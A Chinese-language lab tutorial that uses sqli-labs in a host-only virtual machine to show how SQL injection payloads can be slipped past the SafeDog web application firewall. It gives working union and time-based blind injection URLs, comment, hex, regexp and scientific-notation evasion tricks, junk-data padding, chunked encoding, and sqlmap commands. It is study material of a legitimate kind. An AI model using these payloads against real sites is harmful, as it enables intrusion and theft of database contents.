绕过思路

1. 等价替换（使用能得到相同结果的不同语法）

   （1）1=1

   （2）延迟判断 sleep(3)

2. 构造特殊语法规避

   （1）注释：`/**/` （可代替空格）

   （2）条件注释：`/*!select*/` 

   在所有版本号中取消注释，执行 select

   （3）注释版本号判断：`/*!11440select*/`

   在支持 `11440` 版本的语法中取消注释，执行 select

   > 版本号从 00000—99999 ，可以在 BurpSuite 用字典跑

   （4）换行：%0a 或者综合 %0a 和 %23 使用（需要自己搜索文章补充）

   （5）hex 编码：在 mysql 中可以使用 unhex 语法解析特殊语法的 hex 编码

   在 mysql 中对 `secrity` 字符编码

   ```mysql
   MariaDB [(none)]> select hex("secrity");
   +----------------+
   | hex("secrity") |
   +----------------+
   | 73656372697479 |
   +----------------+
   1 row in set (0.00 sec)
   ```

   解码

   ```mysql
   MariaDB [(none)]> select unhex("73656372697479");
   +-------------------------+
   | unhex("73656372697479") |
   +-------------------------+
   | secrity                 |
   +-------------------------+
   1 row in set (0.00 sec)
   ```

   因此可以使用 hex 解码查询

   ```mysql
   MariaDB [(none)]> select * from information_schema.tables where table_schema=unhex("7365637572697479");
   ```

3. and 参数后可以跟奇数个数的特殊符号，包括但不限于 !~&-

4. regexp 绕过

5. 科学计数法绕过

6. 通用方法

   （1）产品缺陷绕过

   例如性能限制，不能影响正常访问，可以在 POST 中传递大量垃圾数据，某些 WAF 可能放行，也有可能会拦截

   （2）分块传输

   利用 BurpSuite 的 Chunked coding converter 扩展对传输内容进行 Transfer-Encoding: chunked 编码

   > https://github.com/c0ny1/chunked-coding-converter

   > Transfer-Encoding: chunked 很明显容易被识别

## 1 实战

环境准备：

1. 仅主机模式
2. vc9运行库
3. vc11运行库
4. phpStudy
5. sqli-labs
6. 网站安全狗

环境搭建：

将黑客和目标虚拟机切换至仅主机模式

![](./../../../images/SQLi_Bypass/%E5%B0%86%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%87%E6%8D%A2%E8%87%B3%E4%BB%85%E4%B8%BB%E6%9C%BA%E6%A8%A1%E5%BC%8F.png)

安装 vc 运行库

![](./../../../images/SQLi_Bypass/%E5%AE%89%E8%A3%85%20vc%20%E8%BF%90%E8%A1%8C%E5%BA%93.png)

安装 phpStudy

![](./../../../images/SQLi_Bypass/%E5%AE%89%E8%A3%85%20phpStudy.png)

将 sqli-labs 放入站点目录

```
C:\phpStudy\PHPTutorial\WWW\sqli-labs
```

设置 sqli-labs 连接数据库的密码

```
C:\phpStudy\PHPTutorial\WWW\sqli-labs\sql-connections\db-creds.inc
```

```
<?php

//give your mysql connection username n password
$dbuser ='root';
$dbpass ='root';
$dbname ="security";
$host = '127.0.0.1';
$dbname1 = "challenges";



?>
```

> 用户名和密码都是 root

启动 phpStudy

![](./../../../images/SQLi_Bypass/%E5%90%AF%E5%8A%A8%20phpStudy.png)

查看 IP 地址

```
C:\Users\windows>ipconfig

Windows IP 配置


以太网适配器 Ethernet0:

   连接特定的 DNS 后缀 . . . . . . . :
   IPv6 地址 . . . . . . . . . . . . : 2409:8a3c:1005:77a0:b1b8:9bb6:83b2:8a3b
   临时 IPv6 地址. . . . . . . . . . : 2409:8a3c:1005:77a0:15aa:9f47:68f2:32d0
   本地链接 IPv6 地址. . . . . . . . : fe80::b1b8:9bb6:83b2:8a3b%9
   IPv4 地址 . . . . . . . . . . . . : 192.168.1.103
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : fe80::1%9
                                       192.168.1.1
```

浏览器访问 sqli-labs

> http://192.168.186.129/sqli-labs/

点击安装数据库

![](./../../../images/SQLi_Bypass/%E7%82%B9%E5%87%BB%E5%AE%89%E8%A3%85%E6%95%B0%E6%8D%AE%E5%BA%93.png)

成功安装

![](./../../../images/SQLi_Bypass/%E6%88%90%E5%8A%9F%E5%AE%89%E8%A3%85.png)

测试关卡

> http://192.168.186.129/sqli-labs/Less-1/

![](./../../../images/SQLi_Bypass/%E6%B5%8B%E8%AF%95%E5%85%B3%E5%8D%A1.png)

注入成功

![](./../../../images/SQLi_Bypass/%E6%B3%A8%E5%85%A5%E6%88%90%E5%8A%9F.png)

将 phpStudy 切换为系统服务模式

![](./../../../images/SQLi_Bypass/%E5%B0%86%20phpStudy%20%E5%88%87%E6%8D%A2%E4%B8%BA%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%A8%A1%E5%BC%8F.png)

在任务管理器-服务中查找 `apache` 或 `httpd` 服务

![](./../../../images/SQLi_Bypass/%E5%9C%A8%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8-%E6%9C%8D%E5%8A%A1%E4%B8%AD%E6%9F%A5%E6%89%BE%20apache%20%E6%88%96%20httpd%20%E6%9C%8D%E5%8A%A1.png)

>  若找不到则需要手动创建

停止 phpStudy

![](./../../../images/SQLi_Bypass/%E5%81%9C%E6%AD%A2%20phpStudy.png)

在管理员启动的 cmd 切换至对应的路径安装 apache 服务

```
C:\Windows\system32>cd C:\phpStudy\PHPTutorial\Apache\bin
```

手动创建 apache 服务

```
C:\phpStudy\PHPTutorial\Apache\bin>httpd.exe -k install -n apache2.4
Installing the 'apache2.4' service
The 'apache2.4' service is successfully installed.
Testing httpd.conf....
Errors reported here must be corrected before the service can be started.
```

> 成功创建 apache 服务

启动 phpStudy ,管理员权限运行安全狗安装包

![](./../../../images/SQLi_Bypass/%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E5%AE%89%E5%85%A8%E7%8B%97%E5%AE%89%E8%A3%85%E5%8C%85.png)

确认相关信息

![](./../../../images/SQLi_Bypass/%E7%A1%AE%E8%AE%A4%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF.png)

由于安装缓慢，可以停止 phpStudy ，安装狗之后会自动启动服务并完成安装

![](./../../../images/SQLi_Bypass/%E7%94%B1%E4%BA%8E%E5%AE%89%E8%A3%85%E7%BC%93%E6%85%A2%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%81%9C%E6%AD%A2%20phpStudy%20%EF%BC%8C%E5%AE%89%E8%A3%85%E7%8B%97%E4%B9%8B%E5%90%8E%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E5%B9%B6%E5%AE%8C%E6%88%90%E5%AE%89%E8%A3%85.png)

安装完成后点击启动 phpStudy 以启动 mysql

![](./../../../images/SQLi_Bypass/%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90%E5%90%8E%E7%82%B9%E5%87%BB%E5%90%AF%E5%8A%A8%20phpStudy%20%E4%BB%A5%E5%90%AF%E5%8A%A8%20mysql.png)

启动安全狗

![](./../../../images/SQLi_Bypass/%E5%90%AF%E5%8A%A8%E5%AE%89%E5%85%A8%E7%8B%97.png)

测试链接

> http://192.168.186.129/sqli-labs/Less-1/

可以看到拦截页面

![](./../../../images/SQLi_Bypass/%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%8B%A6%E6%88%AA%E9%A1%B5%E9%9D%A2.png)

### 1.1 旧版本的安全狗绕过

### 1.1.1 判断拦截字符

HackBar 注入

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
```

逐个删除提交的字符，直到不拦截

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' union selec
```

在 union 和 select 之间加任意字符，查看是否拦截

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' union !@# select
```

> 发现提交 # 时不拦截，但是 # 将 select 注释掉了，因此只提交 union 是不拦截的

综合以上判断，拦截条件为 union 和 select 同时存在

### 1.1.2 条件注释绕过

### 1.1.2.1 联合查询

提交条件注释

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' union/*!11440select*/ 1,2,3 --+
```

> 成功绕过

查询用户名

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' union/*!11440select*/ 1,user(),3 --+
```

> 发现被拦截

添加注释

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' union/*!11440select*/ 1,user/*!11440*/(),3 --+
```

> 成功绕过
>
> 不可用注释将关键词拆分

### 1.1.2.2 时间盲注

提交时间盲注

```
http://192.168.186.129/sqli-labs/Less-1/?id=1 and if(ascii(substr(database(),1))>115,1,sleep(3)) --+
```

> 发现被拦截

逐个删除判断拦截条件

```
http://192.168.186.129/sqli-labs/Less-1/?id=1 and if(
```

> 因此拦截条件为 `and if(`

添加条件判断注释

```
http://192.168.186.129/sqli-labs/Less-1/?id=1 /*!11440and*/ if(
```

![](./../../../images/SQLi_Bypass/%E6%B7%BB%E5%8A%A0%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD%E6%B3%A8%E9%87%8A.png)

> 成功绕过
>
> 网页响应时间为 2 秒

提交注释后的参数

```
http://192.168.186.129/sqli-labs/Less-1/?id=1'/*!11440and*/if(ascii(substr(database/**/(/*!*/),1,1))>116,1,sleep/**/(/*!3*/))--+
```

> 成功绕过

在 and 后加 !

> and 参数后可以跟奇数个数的特殊符号，包括但不限于 !~&-

```
http://192.168.186.129/sqli-labs/Less-1/?id=1'and!if(ascii(substr(database/**/(/*!*/),1,1))>116,1,sleep/**/(/*!3*/))--+
```

> 不拦截，但是时间与预期不符

![](./../../../images/SQLi_Bypass/%E5%9C%A8%20and%20%E5%90%8E%E5%8A%A0%20!.png)

在 and 后再加两个 `!` 

```
http://192.168.186.129/sqli-labs/Less-1/?id=1'and!!!if(ascii(substr(database/**/(/*!*/),1,1))>116,1,sleep/**/(/*!3*/))--+
```

![(./../../../images/SQLi_Bypass/%E5%9C%A8%20and%20%E5%90%8E%E5%86%8D%E5%8A%A0%E4%B8%A4%E4%B8%AA%20!.png)

> 成功绕过
>
> 响应时间 2 秒加 sleep 时间 3 秒，刚好是 5 秒

### 1.2 新版本的安全狗绕过

### 1.2.1 条件注释绕过

提交参数

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
```

> 被拦截

逐个删除字符，得到拦截语法为 `union selec`

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' union selec
```

加条件注释

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' /*!11440union*//*!11440*//*!11440select*/
```

> 发现依然拦截

### 1.2.1.1 特殊函数爆破

在 BurpSuite 开启拦截

在语句之间的注释添加数字 1，2

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' /*!11440union*//*12*//*!11440select*/
```

在 HackBar 提交

![](./../../../images/SQLi_Bypass/%E5%9C%A8%20HackBar%20%E6%8F%90%E4%BA%A4.png)

将请求发送到 Intruder 标注注释中的 1 和 2 为 payload

![](./../../../images/SQLi_Bypass/%E5%B0%86%E8%AF%B7%E6%B1%82%E5%8F%91%E9%80%81%E5%88%B0%20Intruder%20%E6%A0%87%E6%B3%A8%E6%B3%A8%E9%87%8A%E4%B8%AD%E7%9A%84%201%20%E5%92%8C%202%20%E4%B8%BA%20payload.png)

攻击类型选择集束炸弹

![](./../../../images/SQLi_Bypass/%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%E9%80%89%E6%8B%A9%E9%9B%86%E6%9D%9F%E7%82%B8%E5%BC%B9.png)

分别设置 1 和 2 的 Payload 类型设置为简单列表，并在列表中添加所有 mysql 支持的特殊字符

![](./../../../images/SQLi_Bypass/%E5%88%86%E5%88%AB%E8%AE%BE%E7%BD%AE%201%20%E5%92%8C%202%20%E7%9A%84%20Payload%20%E7%B1%BB%E5%9E%8B%E8%AE%BE%E7%BD%AE%E4%B8%BA%E7%AE%80%E5%8D%95%E5%88%97%E8%A1%A8%EF%BC%8C%E5%B9%B6%E5%9C%A8%E5%88%97%E8%A1%A8%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%89%80%E6%9C%89%20mysql%20%E6%94%AF%E6%8C%81%E7%9A%84%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6.png)

取消 URL 编码

![](./../../../images/SQLi_Bypass/%E5%8F%96%E6%B6%88%20URL%20%E7%BC%96%E7%A0%81.png)

清空检索 - 匹配

![](./../../../images/SQLi_Bypass/%E6%B8%85%E7%A9%BA%E6%A3%80%E7%B4%A2%20-%20%E5%8C%B9%E9%85%8D.png)

开始攻击，查看结果，按长度排序

![](./../../../images/SQLi_Bypass/%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB%EF%BC%8C%E6%9F%A5%E7%9C%8B%E7%BB%93%E6%9E%9C%EF%BC%8C%E6%8C%89%E9%95%BF%E5%BA%A6%E6%8E%92%E5%BA%8F.png)

> 发现大多数为 5335（与失败的结果相同），只有少量的 1005 和 1024，手动测试这几个即可

提交成功的特殊符号手动测试

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1' /*!11440union*//*/!*//*!11440select*/ 1,2,3 --+
```

![](./../../../images/SQLi_Bypass/%E6%8F%90%E4%BA%A4%E6%88%90%E5%8A%9F%E7%9A%84%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95.png)

> 成功绕过
>
> `/*/!*/` 中间的 `/` 后加任意字符都可以，破坏了正则匹配

### 1.2.2 regexp 绕过

```
http://192.168.186.129/sqli-labs/Less-1/?id=1' regexp "%0A%23" /*!11144union %0A select */1,2,3--+
```

### 1.2.3 科学计数法绕过

```
http://192.168.186.129/sqli-labs/Less-1/?id=-1'xor .1e1like "[%0a%23]"/*!11144union %0a select */1,2,3--+
```

### 1.2.4 产品缺陷绕过

使用脚本生成垃圾数据，安全狗大约需要 30 K 的垃圾数据，约为 800 个字符

```
┌──(root㉿kali-31)-[~]
└─# python generationData_bypass.py 800 > bypass.txt
```

查看生成的文件大小

```
┌──(root㉿kali-31)-[~]
└─# du -h bypass.txt                        
32K     bypass.txt
```

测试使用 POST 注入的关卡

> http://192.168.186.129/sqli-labs/Less-11

在 BurpSuite 开启拦截，提交 SQL 注入

```
admin
'union select 1,2-- +
```

在重放器中放行请求数据包，发现未被拦截

> 安全狗默认不检测 POST 请求

**开启安全狗防 POST 类型的 SQL 注入**

以管理员身份运行安全狗

![](./../../../images/SQLi_Bypass/%E4%BB%A5%E7%AE%A1%E7%90%86%E5%91%98%E8%BA%AB%E4%BB%BD%E8%BF%90%E8%A1%8C%E5%AE%89%E5%85%A8%E7%8B%97.png)

点击网站防护

![](./../../../images/SQLi_Bypass/%E7%82%B9%E5%87%BB%E7%BD%91%E7%AB%99%E9%98%B2%E6%8A%A4.png)

点击阻止并记录

![](./../../../images/SQLi_Bypass/%E7%82%B9%E5%87%BB%E9%98%BB%E6%AD%A2%E5%B9%B6%E8%AE%B0%E5%BD%95.png)

防止 SQL 联合查询

![](./../../../images/SQLi_Bypass/%E9%98%B2%E6%AD%A2%20SQL%20%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2.png)

检测 POST

![](./../../../images/SQLi_Bypass/%E6%A3%80%E6%B5%8B%20POST.png)

重启 phpStudy，在重放器中再次发送 POST 请求数据包

![](./../../../images/SQLi_Bypass/%E9%87%8D%E5%90%AF%20phpStudy%EF%BC%8C%E5%9C%A8%E9%87%8D%E6%94%BE%E5%99%A8%E4%B8%AD%E5%86%8D%E6%AC%A1%E5%8F%91%E9%80%81%20POST%20%E8%AF%B7%E6%B1%82%E6%95%B0%E6%8D%AE%E5%8C%85.png)

> 发现请求被拦截

复制 bypass.txt 的内容到请求数据包

注意：

1. 垃圾数据与前一行空一行

   ![](./../../../images/SQLi_Bypass/%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE%E4%B8%8E%E5%89%8D%E4%B8%80%E8%A1%8C%E7%A9%BA%E4%B8%80%E8%A1%8C.png)

2. 垃圾数据的结尾必须为 &，而且不能有换行

   ![](./../../../images/SQLi_Bypass/%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BB%93%E5%B0%BE%E5%BF%85%E9%A1%BB%E4%B8%BA%20&%EF%BC%8C%E8%80%8C%E4%B8%94%E4%B8%8D%E8%83%BD%E6%9C%89%E6%8D%A2%E8%A1%8C.png)

   > 用脚本生成的默认就是  & 结尾

再次发送

![](./../../../images/SQLi_Bypass/%E5%86%8D%E6%AC%A1%E5%8F%91%E9%80%81.png)

> 成功绕过

### 1.2.5 分块传输绕过

下载 BurpSuite 扩展 Chunked coding converter

> https://github.com/c0ny1/chunked-coding-converter

将下载好的 jar 包放在 C:\Program Files\BurpSuite\Extender\chunked-coding-converter-0.4.0.jar 路径下

在扩展中选中扩展文件

![](./../../../images/SQLi_Bypass/%E5%9C%A8%E6%89%A9%E5%B1%95%E4%B8%AD%E9%80%89%E4%B8%AD%E6%89%A9%E5%B1%95%E6%96%87%E4%BB%B6.png)

点击下一个

![](./../../../images/SQLi_Bypass/%E7%82%B9%E5%87%BB%E4%B8%8B%E4%B8%80%E4%B8%AA.png)

点击关闭

![](./../../../images/SQLi_Bypass/%E7%82%B9%E5%87%BB%E5%85%B3%E9%97%AD.png)

勾选 Chunked coding converter 以加载

![](./../../../images/SQLi_Bypass/%E5%8B%BE%E9%80%89%20Chunked%20coding%20converter%20%E4%BB%A5%E5%8A%A0%E8%BD%BD.png)

查看扩展配置

![](./../../../images/SQLi_Bypass/%E6%9F%A5%E7%9C%8B%E6%89%A9%E5%B1%95%E9%85%8D%E7%BD%AE.png)

只开启代理即可

![](./../../../images/SQLi_Bypass/%E5%8F%AA%E5%BC%80%E5%90%AF%E4%BB%A3%E7%90%86%E5%8D%B3%E5%8F%AF.png)

> 其中分块大小表示将请求体数据每段大小，注释长度表示添加的数据大小
>
> Act on 表示这个扩展在哪里生效，若勾选代理，则是从代理发送的请求包自动进行分块处理

点击编码请求体

![](./../../../images/SQLi_Bypass/%E7%82%B9%E5%87%BB%E7%BC%96%E7%A0%81%E8%AF%B7%E6%B1%82%E4%BD%93.png)

发送请求数据包

![](./../../../images/SQLi_Bypass/%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E6%95%B0%E6%8D%AE%E5%8C%85.png)

> 可以看到成功绕过
>
> 并且在请求体中进行了分块处理

**使用 sqlmap 利用分块传输饶过**

在 BurpSuite 添加一个可被 Kali 访问的代理

![](./../../../images/SQLi_Bypass/%E5%9C%A8%20BurpSuite%20%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%8F%AF%E8%A2%AB%20Kali%20%E8%AE%BF%E9%97%AE%E7%9A%84%E4%BB%A3%E7%90%86.png)

保存 BurpSuite 的请求数据包到 Kali 的 reg.txt

```http
POST /sqli-labs/Less-11/ HTTP/1.1
Host: 192.168.1.15
Content-Length: 30
Cache-Control: max-age=0
Origin: http://192.168.1.15
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,images/avif,images/webp,images/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.15/sqli-labs/Less-11/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

uname=1&passwd=2&submit=Submit
```

> 交互栏的传输内容任意

在 sqlmap 指定请求文件和代理爆破

```
┌──(root㉿kali-31)-[~]
└─# sqlmap -r reg.txt --technique U -p passwd --batch --proxy=http://192.168.1.16:8080
```

![](./../../../images/SQLi_Bypass/%E5%9C%A8%20sqlmap%20%E6%8C%87%E5%AE%9A%E8%AF%B7%E6%B1%82%E6%96%87%E4%BB%B6%E5%92%8C%E4%BB%A3%E7%90%86%E7%88%86%E7%A0%B4.png)

> 可以看到经过扩展的请求体自动进行了分块处理
